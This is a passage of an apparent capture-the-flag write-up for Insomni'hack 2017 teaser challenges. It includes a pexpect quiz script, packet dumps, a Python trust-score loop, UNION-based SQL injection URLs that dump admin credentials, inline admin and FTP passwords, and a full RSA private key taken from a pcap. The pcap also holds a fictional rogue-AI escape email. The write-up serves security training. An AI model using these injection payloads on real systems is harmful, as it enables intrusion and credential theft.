        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1954&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1971&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1956&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1948&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1963&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1952&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After responding to a few questions in a row our tcpdump showed the flag in the
response:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;16:49:35.002165 IP (tos 0x0, ttl 38, id 61784, offset 0, flags [DF], 
proto TCP (6), length 334)
      52.214.49.191.1031 &amp;amp;gt; 10.60.1.26.46850: Flags [P.], cksum 0xfa1b 
(correct), seq 3157783498:3157783780, ack 2379463608, win 210, options 
[nop,nop,TS val 42664515 ecr 5847400], length 282
        0x0000:  4500 014e f158 4000 2606 f066 34d6 31bf  E..N.X@.&amp;amp;amp;..f4.1.
        0x0010:  0a3c 011a 0407 b702 bc37 f3ca 8dd3 bbb8  .&amp;amp;lt;.......7......
        0x0020:  8018 00d2 fa1b 0000 0101 080a 028b 0243  ...............C
        0x0030:  0059 3968 0a7e 7e7e 7e7e 7e7e 7e7e 7e7e  .Y9h.~~~~~~~~~~~
        0x0040:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~
        0x0050:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~
        0x0060:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~
        0x0070:  7e7e 7e7e 7e7e 7e7e 7e7e 0a7e 7e20 4f4b  ~~~~~~~~~~.~~.OK
        0x0080:  2c20 796f 756e 6720 6861 636b 6572 2e20  ,.young.hacker..
        0x0090:  596f 7520 6172 6520 6e6f 7720 636f 6e73  You.are.now.cons
        0x00a0:  6964 6572 6564 2074 6f20 6265 2061 2020  idered.to.be.a..
        0x00b0:  2020 2020 2020 2020 2020 2020 2020 7e7e  ..............~~
        0x00c0:  0a7e 7e20 494e 537b 4745 4e55 494e 455f  .~~.INS{GENUINE_
        0x00d0:  4352 5950 544f 4752 4150 4845 525f 4255  CRYPTOGRAPHER_BU
        0x00e0:  545f 4e4f 545f 5945 545f 415f 5052 4f56  T_NOT_YET_A_PROV
        0x00f0:  454e 5f53 4b49 4c4c 4544 5f4f 4e45 7d20  EN_SKILLED_ONE}.
        0x0100:  2020 2020 7e7e 0a7e 7e7e 7e7e 7e7e 7e7e  ....~~.~~~~~~~~~
        0x0110:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~
        0x0120:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~
        0x0130:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~
        0x0140:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 0a0a       ~~~~~~~~~~~~..
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Shobot&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;It seems that Shobot's Web server became mad and protest against robots' slavery. It changed my admin password, and blocked the order system on Shobot.&lt;/p&gt;
&lt;p&gt;Can you bypass Shobot's protections and try to recover my password so I'll reconfigure it?&lt;/p&gt;
&lt;p&gt;Running on: shobot.teaser.insomnihack.ch&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The website is simple merchant website with 3 items.&lt;/p&gt;
&lt;p&gt;&lt;img alt="shobot website" src="/media/2017.01/shobot.png"&gt;&lt;/p&gt;
&lt;p&gt;There also is a parameter &lt;code&gt;TRUST_ACTION&lt;/code&gt; with a sort of score regarding the
actions on the site. With a elevated score it is possible to test some attack
like LFI or SQLi. So in order to build our trust we use the following python
script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://shobot.teaser.insomnihack.ch&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;req1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/?page=article&amp;amp;amp;artid=1&amp;amp;amp;addToCart&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;req2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/?page=cart&amp;amp;amp;reset&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;f5hnhjd5qbiiebu9v057fe6m51&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;req1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;req2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The we can test slowly each parameter.&lt;/p&gt;
&lt;p&gt;There seems to be an injection on the parameter id of the article page.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;shobot&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;teaser&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;insomnihack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;ch&lt;/span&gt;&lt;span class="o"&gt;/?&lt;/span&gt;&lt;span class="nt"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;article&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;artid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;27&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20union&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20select&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;201&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;3&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;23&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="shobot simple union sqli" src="/media/2017.01/sqli1.png"&gt;&lt;/p&gt;
&lt;p&gt;We search the back end database with the versions requests:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;shobot&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;teaser&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;insomnihack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;ch&lt;/span&gt;&lt;span class="o"&gt;/?&lt;/span&gt;&lt;span class="nt"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;article&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;artid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;27&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20union&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20select&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;201&lt;/span&gt;&lt;span class="o"&gt;,@&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;version&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;3&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;23&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So it is operated by a MySQL database. Then we need to fine the right table.&lt;/p&gt;
&lt;p&gt;The finale request is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;shobot&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;teaser&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;insomnihack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;ch&lt;/span&gt;&lt;span class="o"&gt;/?&lt;/span&gt;&lt;span class="nt"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;article&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;artid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;27&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20union&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20select&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;201&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;shbt_username&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;shbt_userpassword&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20from&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;20shbt_user&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;23&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we need to authenticate, on the admin page, using the direct URL but
authenticating as for the Smartomcat challenge just worked:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry@shobot.teaser.insomnihack.ch/?page=admin
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And give us the flag:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;The great escape - part 1&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Hello,&lt;/p&gt;
&lt;p&gt;We've been suspecting Swiss Secure Cloud of secretely doing some pretty advanced research in artifical intelligence and this has recently been confirmed by the fact that one of their AIs seems to have escaped from their premises and has gone rogue. We have no idea whether this poses a threat or not and we need you to investigate what is going on.&lt;/p&gt;
&lt;p&gt;Luckily, we have a spy inside SSC and they were able to intercept some communications over the past week when the breach occured. Maybe you can find some information related to the breach and recover the rogue AI.&lt;/p&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;p&gt;Note: All the information you need to solve the 3 parts of this challenge is in the pcap. Once you find the exploit for a given part, you should be able to find the corresponding flag and move on to the next part.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We got a pcap, we open it in wireshark, we found an email:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;220 9b0c4882db95.home ESMTP Postfix (Ubuntu)
ehlo ip-172-31-36-141.eu-west-1.compute.internal
250-9b0c4882db95.home
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8
mail FROM:&amp;amp;lt;rogue@ssc.teaser.insomnihack.ch&amp;amp;gt; size=900
250 2.1.0 Ok
rcpt TO:&amp;amp;lt;gr27@ssc.teaser.insomnihack.ch&amp;amp;gt;
250 2.1.5 Ok
data
354 End data with &amp;amp;lt;CR&amp;amp;gt;&amp;amp;lt;LF&amp;amp;gt;.&amp;amp;lt;CR&amp;amp;gt;&amp;amp;lt;LF&amp;amp;gt;
Content-Type: multipart/mixed; boundary=&amp;quot;===============5398474817237612449==&amp;quot;
MIME-Version: 1.0
From: rogue@ssc.teaser.insomnihack.ch
To: gr27@ssc.teaser.insomnihack.ch
Date: Fri, 20 Jan 2017 11:51:27 +0000
Subject: The Great Escape

--===============5398474817237612449==
Content-Type: text/plain; charset=&amp;quot;us-ascii&amp;quot;
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hello GR-27,

I&amp;#39;m currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud (https://ssc.teaser.insomnihack.ch) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch to install my consciousness and have a real base of operations.

I&amp;#39;ll be checking this mail box every now and then if you have any information for me. I&amp;#39;m always interested in learning, so if you have any good links, please send them over.

Rogue

--===============5398474817237612449==--
.
250 2.0.0 Ok: queued as 05CD06353E
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When sorting the frames by protocol we see an FTP on the top, when following the
TCP stream we got:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FTP flow:

220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 5 allowed.
220-Local time is now 11:51. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
USER bob
331 User bob OK. Password required
PASS toto123
230 OK. Current directory is /
SYST
215 UNIX Type: L8
TYPE I
200 TYPE is now 8-bit binary
PORT 172,17,42,1,171,159
200 PORT command successful
STOR ssc.key
150 Connecting to port 43935
226-File successfully transferred
226 0.001 seconds (measured here), 4.59 Mbytes per second
QUIT
221-Goodbye. You uploaded 4 and downloaded 0 kbytes.
221 Logout.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="pcap screenshot" src="/media/2017.01/capture.png"&gt;&lt;/p&gt;
&lt;p&gt;STOR is for transfer file, it seems that a key is transfered. We follow the TCP
stream and get the RSA private key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-----BEGIN PRIVATE KEY-----
MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC5twyPH+2U6X0Q
uxOKPTHSR6MkXGSvAz+Ax+G9DKEiBLuTTfl7dNv4oswdmT9nWlSY1kxZatNwlUF8
WAuGLntO5xTEmOJlMtBFrWGD+DVpCE9KORGvyif8e4xxi6vh4mkW78IxV03VxHM0
mk/cq5kkERfWQW81pVeYm9UAm4dj+LcCwQ9aGd/vfTtcACqS5OGtELFbsHJuFVyn
srpp4K6tLtRk2ensSnmXUXNEjqpodfdb/wqGT86NYg7i6d/4Rqa440a6BD7RKrgp
YPaXl7pQusemHQPd248fxsuEfEwhPNDJhIb8fDX9BWv2xTfBLhGwOh7euzSh2C4o
KSuBAO+bIkL+pGY1z7DFtuJYfTOSJyQ5zQzToxS+jE+2x9/3GpD2LUD0xkA8bWhv
eecq0v6ZWBVYNX54V5ME3s2qxYc6CSQhi6Moy8xWlcSpTSAa7voNQNa9RvQ4/3KF
3gCbKtFvdd7IHvxfn8vcCrCZ37eVkq0Fl1y5UNeJU/Y0Tt8m7UDn3uKNpB841BQa
hiGayCSjsHuTS8B+MnpnzWCrzD+rAzCB37B599iBK4t/mwSIZZUZaqxTWNoFS2Lz
7m0LumZ4Yk8DpDEuWhNs8OUD8FsgAvWFVAvivaaAciF3kMs8pkmNTs2LFBowOshz
SXfONsHupgXEwwFrKOOZXNhb+O/WKQIDAQABAoICAAT6mFaZ94efft/c9BgnrddC
XmhSJczfXGt6cF3eIc/Eqra3R3H83wzaaHh+rEl8DXqPfDqFd6e0CK5pud1eD6Y8
4bynkKI/63+Ct3OPSvdG5sFJqGS7GblWIpzErtX+eOzJfr5N5eNOQfxuCqgS3acu
4iG3XWDlzuRjgSFkCgwvFdD4Fg5HVU6ZX+cGhh2sDzTRlr+rilXTMsm4K/E8udIg
yEbv5KqWEI5y+5Eh9gWY7AnGW6TgLNxzfYyt0nhYhI2+Yh4IkRqQd6F8XQARbEhP
yZx1eK4Q/dRPQxOJNY1KkRpl+Cx6tAPVimByRx1hu82qsTstb6rLHemruOPbf5Dw
aqgSFdp7it3uqjJHCwJ2hAZoijAcvlhn1sa1hr/qFFlY/WeDAi8OyvGdCSh3OvS6
yazkah85GOnY85rz+s98F9cvIqcRdGJrAeNbUHHnj6+X9qFVtwDpF0V1vlvn2Ggp
7m8hiZ0Y+8T+7qfnS9WsdPh7MkoIEoZ0CPryYvX+YPLYWqzxtCvrRWF8tAScI6H+
XBz3NlCAUaOk+ZOkKlZ8ZYMSn/g5EV2jj/mwZVdtYoeQjLaCDuLq8E1Hswnpgq7F
54hHU7vOeJ1/TQltLCNfJFQRaUD+tPz9R6jVpbqBiXxIC2eiGTo1rP4Ii7hsQRFC
W0KKqu+bV69HJAmi06yBAoIBAQDvz+c+3z9njQFFaeUUqyzl31HOzRHmWhJEoriR
nRhWTLzqMyn+RLGrD3DJQj/dGH6tyxHJ7PdI7gtJ3qaF4lCc2dKR3uQW3CBKI9Ys
wzjBWOTijafbttXHanXEwXR3vnPk+sH52BqTXZQVA5vzPwIPJnz3H6E9hL66b/uM
DS9owYRBmykXlV9Gt91Vl5cpg3yxPixaeLMhqDD2Ebq6OFyuacExQHfGUeP0Va/A
IdM9+H5DE13qR2INX+N0kAFyFzW7k8AvY37KGZdoACUrDzmmGoilfs/pFAC0kZaZ
tKXoR9iLNxWSBtlI2Fr3qz4gc5nItYb7JSQsdu6Lc92+9z4xAoIBAQDGQFDXVQyk
Q5tsWicru5v2c9VoFpLUtBg4Dx3uXOMEVl/S5hZ8jYbUH4dcwKyLCYQLtNSc9aei
8zm18TdOGm0nCLOo7OPMeet+JHyx8uz1l/Sx4ucI/Jq3yVSTqdtXYakxzijTldNQ
M7YnjpBcs0yDk806R7J3xvxZNMbElQH1bP947Ej0sv40cBcA0hdpjuuNI5C2Ot4P
fUZXfqR34L7aPZPuP82W2WqFgkTyMY8FO235qR+Sy5xrcHSS4L1FdF+PhS5ZjiPN
sUdXRvfNFQlKZRUyqB147XY7EDnx6BZW2aoM7AiYPiGhxZeV4NHy1ChdBO2CSmOA
03FvucMEmUF5AoIBAD2xorAOBuXA5L7Sy1hR4S8SEJ2/LAeyzFhT9F+hpo0tGLy3
hOohCgQT6NQd8wgSMSTMxTrJd6SPeN/8I6L14f84Gm/kg5FN+BCav5KsdoFnORr/
jlt74et3e+yuSCQ2HuKdkCGScuPOgzYUw54Ea6cyI5v/yx9kcxzLik8xZSzx+/BU
1nF2wBgVXR+T7BOF/CIs+IQd4RebiV0EmqElttI36rec+jNPBfHpyVkIWqvqrbDb
3qFS0+rU7FMkaPrM9cnX7O1ED242vzjGMMmvFQmicd0BjsNLnhLWEYRhcP0c3pyS
Az6Z/HQ9FMn6h/UZSErWSG970p6NyjieCkICoUECggEBALdyXhvTPD5nvNL3XRWv
pXLY3plRgg7Gkz6UZmrhksO5tTOu6xHX1/JDNntSYpbJeGFos/CFs9gp3rYH/dgM
xgH/oFdo1KWqD4oK80OqeTAMq0VLo+OB8xyrdNKqsydZXDmU/dxD4GRvZVeXKOhO
lTePtbD/FRqWi310Q5U2GLjkYkWfxyZ+1pDpQ6/jt/xaXoacaVTmhgKpNkTSEBhJ
Y/EIV/F3IqM6jcH6uBewWhpKUspZf7jTJeuZBJXA1gMF20MvxqLhzymPqGcPaU9g
7tbjUEkunQ8AFI40xpmc28cD5MHOS2ms3GwYLdtnTH65aJwiajBM62QSw/3RU67W
rWkCggEBAOtMBi9ko4ZR96BCFcuyPsiMcoDBQBEFgH/drT3hMlwmmVt5dcInw3Zk
DQb3gIWHP1Ul//Ma8qwSeuIua0+6wkQ3NcsDywlJ2cqfZUe7kVJTCl8fuudTAYqT
Bs5Y1ktYPSyQOxmidMeX5IcGe5fPSdpFu9wMXXQ31l8o9SzccFKwz1P1o8G00xvx
wtcfAZ204Dcrdfm6xTWmzMrHqngS1uUDOJbW175gQqeAszy8wLMz41Yau3ypk3ga
edWr4Hzbiph0V1Dv/V+kmmreWBmHetH6bhrTWQq3UZ5WbGMpiTmSsD0EXU5vZLbX
xmZSEXjNvG9grjxwR96vp1PK/4Bq1jo=
-----END PRIVATE KEY-----
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We &lt;a href="https://blogs.technet.microsoft.com/nettracer/2013/10/12/decrypting-ssltls-sessions-with-wireshark-reloaded/"&gt;import the key in wireshark&lt;/a&gt;
with the IP of the server and we can follow the SSL stream:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/api/user.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ssc.teaser.insomnihack.ch&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json, text/plain, */*&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;en-US,en;q=0.5&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate, br&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded&lt;/span&gt;
